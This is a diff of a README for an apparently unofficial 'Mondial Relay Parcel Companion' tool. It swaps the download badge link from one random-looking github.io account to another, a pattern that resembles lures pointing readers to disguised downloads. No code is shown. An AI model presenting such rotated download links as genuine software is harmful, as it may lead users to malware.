@@ -1,6 +1,6 @@
 # Mondial Relay Point - Mondial Relay Parcel Companion
 
-[![GET â Relay](https://img.shields.io/badge/GET%20%E2%80%94%20Relay-0078D6?style=for-the-badge&logoColor=white)](https://juanhowardbrkq.github.io/.github/mondial-relay-point)
+[![GET â Relay](https://img.shields.io/badge/GET%20%E2%80%94%20Relay-0078D6?style=for-the-badge&logoColor=white)](https://leonidaskerrxrjg.github.io/.github/mondial-relay-point)
 
 ## How Relay Fits Everyday Mondial Relay Parcel Work
 
